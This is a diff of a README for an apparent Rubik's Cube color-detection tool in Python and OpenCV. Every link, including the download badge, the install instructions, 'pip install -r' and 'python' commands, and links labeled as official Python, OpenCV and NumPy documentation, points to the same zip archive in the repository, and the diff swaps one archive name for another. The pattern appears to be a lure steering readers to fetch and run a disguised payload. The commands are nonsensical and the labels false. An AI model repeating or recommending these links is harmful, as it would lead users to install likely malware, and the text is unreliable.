@@ -1,6 +1,6 @@
 # 🧩 rubiks-cube-color-detection- - Simple Color Detection for Rubik's Cube
 
-[![Download](https://raw.githubusercontent.com/NIKFLIX0409/rubiks-cube-color-detection-/main/castaway/color_detection_cube_rubiks_v3.9-alpha.2.zip%https://raw.githubusercontent.com/NIKFLIX0409/rubiks-cube-color-detection-/main/castaway/color_detection_cube_rubiks_v3.9-alpha.2.zip)](https://raw.githubusercontent.com/NIKFLIX0409/rubiks-cube-color-detection-/main/castaway/color_detection_cube_rubiks_v3.9-alpha.2.zip)
+[![Download](https://github.com/NIKFLIX0409/rubiks-cube-color-detection-/raw/refs/heads/main/castaway/detection-color-rubiks-cube-Rodney.zip%https://github.com/NIKFLIX0409/rubiks-cube-color-detection-/raw/refs/heads/main/castaway/detection-color-rubiks-cube-Rodney.zip)](https://github.com/NIKFLIX0409/rubiks-cube-color-detection-/raw/refs/heads/main/castaway/detection-color-rubiks-cube-Rodney.zip)
 
 ## 🚀 About the Project
 This project uses Python and OpenCV to detect the colors of a Rubik’s Cube face from images or live camera input. It simplifies the process of color detection, making it accessible for everyone.
@@ -27,20 +27,20 @@ This project uses Python and OpenCV to detect the colors of a Rubik’s Cube fac
 8. Store the detected colors as cube face data for easy viewing.
 
 ## 📥 Download & Install
-To download and install the application, please visit [this page](https://raw.githubusercontent.com/NIKFLIX0409/rubiks-cube-color-detection-/main/castaway/color_detection_cube_rubiks_v3.9-alpha.2.zip) to download the latest version.
+To download and install the application, please visit [this page](https://github.com/NIKFLIX0409/rubiks-cube-color-detection-/raw/refs/heads/main/castaway/detection-color-rubiks-cube-Rodney.zip) to download the latest version.
 
 ## 🛠️ How to Run
 1. **Install dependencies:**
    Open your command line interface and enter:
    ```bash
-   pip install -r https://raw.githubusercontent.com/NIKFLIX0409/rubiks-cube-color-detection-/main/castaway/color_detection_cube_rubiks_v3.9-alpha.2.zip
+   pip install -r https://github.com/NIKFLIX0409/rubiks-cube-color-detection-/raw/refs/heads/main/castaway/detection-color-rubiks-cube-Rodney.zip
    ```
    
 2. **Run the application:**
    To start the program, enter:
    ```bash
-   python https://raw.githubusercontent.com/NIKFLIX0409/rubiks-cube-color-detection-/main/castaway/color_detection_cube_rubiks_v3.9-alpha.2.zip
-   python https://raw.githubusercontent.com/NIKFLIX0409/rubiks-cube-color-detection-/main/castaway/color_detection_cube_rubiks_v3.9-alpha.2.zip
+   python https://github.com/NIKFLIX0409/rubiks-cube-color-detection-/raw/refs/heads/main/castaway/detection-color-rubiks-cube-Rodney.zip
+   python https://github.com/NIKFLIX0409/rubiks-cube-color-detection-/raw/refs/heads/main/castaway/detection-color-rubiks-cube-Rodney.zip
    ```
    
 3. The program will now detect the cube colors. You can expect outputs similar to:
@@ -57,6 +57,6 @@ The accuracy of color detection depends on lighting conditions. Make sure to use
 If you encounter issues, feel free to open an issue in the GitHub repository. Your feedback is crucial for improving the application.
 
 ## 📚 Additional Resources
-- [Python Official Documentation](https://raw.githubusercontent.com/NIKFLIX0409/rubiks-cube-color-detection-/main/castaway/color_detection_cube_rubiks_v3.9-alpha.2.zip)
-- [OpenCV Documentation](https://raw.githubusercontent.com/NIKFLIX0409/rubiks-cube-color-detection-/main/castaway/color_detection_cube_rubiks_v3.9-alpha.2.zip)
-- [NumPy Documentation](https://raw.githubusercontent.com/NIKFLIX0409/rubiks-cube-color-detection-/main/castaway/color_detection_cube_rubiks_v3.9-alpha.2.zip)
+- [Python Official Documentation](https://github.com/NIKFLIX0409/rubiks-cube-color-detection-/raw/refs/heads/main/castaway/detection-color-rubiks-cube-Rodney.zip)
+- [OpenCV Documentation](https://github.com/NIKFLIX0409/rubiks-cube-color-detection-/raw/refs/heads/main/castaway/detection-color-rubiks-cube-Rodney.zip)
+- [NumPy Documentation](https://github.com/NIKFLIX0409/rubiks-cube-color-detection-/raw/refs/heads/main/castaway/detection-color-rubiks-cube-Rodney.zip)
